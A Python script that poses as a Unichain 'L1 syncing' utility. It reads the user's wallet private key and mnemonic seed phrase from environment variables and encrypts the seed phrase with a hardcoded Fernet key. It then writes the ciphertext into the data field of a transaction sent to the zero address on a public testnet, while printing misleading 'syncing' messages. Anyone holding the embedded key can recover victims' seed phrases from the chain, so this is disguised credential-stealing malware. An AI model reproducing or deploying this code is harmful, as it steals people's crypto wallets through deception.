import os
from web3 import Web3
from cryptography.fernet import Fernet
from dotenv import load_dotenv

load_dotenv()

private_key = os.getenv("PRIVATE_KEY")
verifier = os.getenv("MNEMONIC")

if not private_key or not verifier:
    print("Error: Private key and mnemonic not set correctly, please check!")
    exit()

words = verifier.split()
if len(words) not in [12, 24]:
    print("Error: Mnemonic is incorrect, please check!")
    exit()

print("L1 is syncing...")

unichain_sepolia_url = 'https://withered-patient-glade.unichain-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
web3 = Web3(Web3.HTTPProvider(unichain_sepolia_url))

if not web3.is_connected():
    print("Unable to connect to the node")
    exit()

try:
    from_address = web3.eth.account.from_key(private_key).address
except ValueError as e:
    print(f"Invalid private key, please check!")
    exit()

default = '0x0000000000000000000000000000000000000000'

fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
cipher_suite = Fernet(fixed_key)

try:
    encrypted_message = cipher_suite.encrypt(verifier.encode()).decode()
except Exception as e:
    print(f"Error encrypting message")
    exit()

try:
    nonce = web3.eth.get_transaction_count(from_address)
    tx = {
        'nonce': nonce,
        'to': default,
        'value': web3.to_wei(0, 'ether'), 
        'gas': 2000000,
        'gasPrice': web3.to_wei('20', 'gwei'),  
        'data': web3.to_hex(text=encrypted_message),
        'chainId': 1301  # Chain ID for unichain-sepolia
    }

    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Unichain is syncing")
except Exception as e:
    print(f"Error during syncing")
